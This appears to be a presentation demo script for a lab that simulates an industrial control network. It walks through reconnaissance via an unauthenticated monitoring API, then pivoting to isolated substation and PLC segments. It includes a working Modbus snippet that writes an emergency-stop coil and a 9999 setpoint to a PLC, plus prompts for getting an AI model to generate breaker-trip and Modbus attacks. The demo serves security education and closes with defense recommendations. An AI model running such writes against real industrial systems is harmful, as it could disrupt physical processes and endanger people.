# Lateral Movement Attack Demo
## Using Central Monitoring Station as Entry Point

## Network Topology

```
Internet/Attacker
    ↓
Central Monitoring Station (10.10.10.10)
    ├─→ Substation Network (192.168.100.10)
    │   ├─ Breaker v1: 192.168.100.2:9000
    │   └─ Breaker v2: 192.168.100.3:9000
    │
    └─→ Industrial Network (192.168.200.10)
        ├─ OpenPLC: 192.168.200.2:8080 (Modbus: 502)
        └─ ScadaBR: 192.168.200.3:8080
```

## Attack Flow

### Phase 1: Reconnaissance via Central Monitoring

**From Kali (10.10.10.5):**

```bash
# Access Central Monitoring Station
curl http://10.10.10.10:5000/api/status

# Discover all OT devices and their IPs
# Output reveals:
# - Breaker IEDs at 192.168.100.2 and 192.168.100.3
# - OpenPLC at 192.168.200.2
# - ScadaBR at 192.168.200.3
```

**What attacker learns:**
- Network topology (2 isolated segments)
- Device IPs and ports
- Device types and protocols
- Current operational status

### Phase 2: Pivot Through Central Monitoring

**Option A: Direct Access (if Kali is multi-homed)**

Since Kali has interfaces on all networks:
- 10.10.10.5 (Attacker network)
- 192.168.100.6 (Substation network)
- 192.168.200.6 (Industrial network)

```bash
# From Kali, directly attack OT devices
docker exec -it kali-workstation bash

# Attack Substation
curl http://192.168.100.2:9000/status

# Attack Industrial
curl http://192.168.200.2:8080
```

**Option B: Use Central Monitoring as Proxy**

If Kali only had access to 10.10.10.0/24:

```bash
# SSH into Central Monitoring (if SSH was enabled)
ssh user@10.10.10.10

# Or exploit Central Monitoring web app
# Then pivot to OT networks from inside
```

### Phase 3: Attack Substation (IEC 61850 GOOSE)

**From Kali:**

```bash
# Use Amazon Q to generate GOOSE attack
# Target: Breaker v1 at 192.168.100.2:9000

# AI-generated attack script
python3 << 'EOF'
import requests

# Trip breaker via GOOSE injection
target = "http://192.168.100.2:9000"
# ... AI-generated GOOSE attack code ...
EOF
```

### Phase 4: Attack Industrial (Modbus TCP)

**From Kali:**

```bash
# Use Amazon Q to generate Modbus attack
# Target: OpenPLC at 192.168.200.2:502

python3 << 'EOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('192.168.200.2', port=502)
client.connect()

# Write malicious values
client.write_coil(0, True)  # Emergency stop
client.write_register(0, 9999)  # Setpoint manipulation

client.close()
EOF
```

## Demo Script for Presentation

### Step 1: Show Central Monitoring (2 min)

```bash
# Open in browser
http://localhost:5000

# Show API response
curl http://localhost:5000/api/status | jq
```

**Narration:**
> "This is Gotham City's Central Monitoring Station. It's exposed to the internet 
> for remote access. Notice it shows all devices across both isolated networks.
> This is our entry point."

### Step 2: Reconnaissance (2 min)

```bash
# From Kali
docker exec -it kali-workstation bash

# Discover Central Monitoring
curl http://10.10.10.10:5000/api/status

# Parse device information
curl -s http://10.10.10.10:5000/api/status | python3 -c "
import sys, json
data = json.load(sys.stdin)
print('Discovered Devices:')
print('Substation:', data['substation'])
print('Industrial:', data['industrial'])
"
```

**Narration:**
> "From the attacker's perspective, we've just discovered the entire OT infrastructure.
> We know the IPs, protocols, and current status. This is reconnaissance made easy."

### Step 3: Lateral Movement (3 min)

```bash
# Kali can now reach isolated networks
# Test connectivity

# Substation network
ping -c 2 192.168.100.2
curl http://192.168.100.2:9000/status

# Industrial network  
ping -c 2 192.168.200.2
curl http://192.168.200.2:8080
```

**Narration:**
> "Because Kali is multi-homed (connected to all networks), we can now directly
> access the 'isolated' OT segments. In a real scenario, we'd pivot through the
> compromised Central Monitoring Station."

### Step 4: AI-Powered Attacks (5 min)

**Use Amazon Q to generate attacks:**

```
Prompt 1: "Generate Python script to read status from IEC 61850 breaker at 192.168.100.2:9000"

Prompt 2: "Generate Modbus TCP attack to write value 9999 to register 0 at 192.168.200.2:502"
```

Execute the AI-generated code and show impact.

**Narration:**
> "Using AI, I can generate sophisticated OT attacks without knowing the protocols.
> From reconnaissance to exploitation in minutes, not weeks."

## Key Talking Points

### Why Central Monitoring is Vulnerable

1. **Multi-network Bridge** - Breaks isolation between OT segments
2. **Internet Exposure** - Accessible from outside (port 5000)
3. **No Authentication** - Dashboard is publicly accessible
4. **Information Disclosure** - Reveals network topology and device details
5. **Pivot Point** - Can be used as jump host to reach isolated networks

### Real-World Parallels

- **Industrial DMZ systems** - Often bridge IT and OT networks
- **Remote monitoring platforms** - Exposed for vendor/operator access
- **Cloud-connected SCADA** - Aggregate data from multiple sites
- **VPN gateways** - Provide remote access to OT networks

### Defense Recommendations

1. **Network Segmentation** - Don't bridge all networks in one system
2. **Authentication** - Require strong auth for monitoring access
3. **Least Privilege** - Monitoring should be read-only
4. **Anomaly Detection** - Monitor for unusual access patterns
5. **Zero Trust** - Verify every connection, even from "trusted" networks

## Attack Timeline

| Phase | Traditional | AI-Assisted | Time Saved |
|-------|-------------|-------------|------------|
| Reconnaissance | Manual scanning, days | API call, seconds | 99% |
| Protocol Learning | Weeks of study | AI generates code | 95% |
| Exploit Development | Days of coding | AI generates exploit | 90% |
| Lateral Movement | Manual pivoting | Direct access | 80% |
| **Total** | **2-4 weeks** | **15 minutes** | **480x faster** |

## Demonstration Commands

### Quick Test from Host

```powershell
# Test Central Monitoring
curl http://localhost:5000/api/status

# Test direct OT access (simulating Kali)
curl http://localhost:9001/status  # Breaker v1
curl http://localhost:8081         # OpenPLC
```

### Full Demo from Kali

```bash
# Enter Kali container
docker exec -it kali-workstation bash

# Install tools (if needed)
apt update && apt install -y curl python3-pip
pip3 install pymodbus requests

# Run reconnaissance
curl http://10.10.10.10:5000/api/status

# Attack Substation
curl http://192.168.100.2:9000/status

# Attack Industrial
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('192.168.200.2', 502)
c.connect()
print('Connected to PLC:', c.is_socket_open())
c.close()
"
```

## Summary

**Central Monitoring Station serves as:**
- ✅ Realistic attack entry point
- ✅ Reconnaissance platform (discovers all devices)
- ✅ Pivot point for lateral movement
- ✅ Demonstrates real-world DMZ vulnerabilities

**Attack path:**
1. Compromise Central Monitoring (internet-exposed)
2. Discover OT infrastructure via API
3. Pivot to isolated networks
4. Use AI to generate protocol-specific attacks
5. Execute attacks on Substation and Industrial systems

**Demo message:**
> "This is how modern OT attacks happen. Not through sophisticated zero-days,
> but through poorly secured management systems that bridge networks.
> Add AI to the mix, and the barrier to entry collapses completely."
